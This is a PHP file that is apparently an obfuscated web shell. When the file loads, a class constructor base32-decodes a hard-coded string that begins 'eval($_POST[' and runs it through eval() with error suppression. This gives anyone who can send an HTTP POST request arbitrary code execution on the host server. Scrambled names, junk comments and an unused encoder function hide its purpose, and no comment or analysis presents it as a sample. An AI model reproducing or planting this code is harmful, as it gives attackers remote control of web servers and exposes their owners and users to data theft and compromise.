<?php
class TNDO{
        public $XHQM = null;
        public $VKBR = null;
        function __construct(){
        $this->XHQM = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->VKBR = @XRKL($this->XHQM);
        @eval("/*c![>qQy*/".$this->VKBR."/*c![>qQy*/");
        }}
new TNDO();
function GRTM($JSHZ){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $QKYA = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($JSHZ); $i < $j; $i++){
    $v <<= 8;
        $v += ord($JSHZ[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $QKYA .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $QKYA .= $BASE32_ALPHABET[$v];}
    return $QKYA;}
function XRKL($JSHZ){
    $QKYA = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($JSHZ); $i < $j; $i++){
        $v <<= 5;
        if ($JSHZ[$i] >= 'a' && $JSHZ[$i] <= 'z'){
            $v += (ord($JSHZ[$i]) - 97);
        } elseif ($JSHZ[$i] >= '2' && $JSHZ[$i] <= '7') {
            $v += (24 + $JSHZ[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $QKYA .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $QKYA;}
?>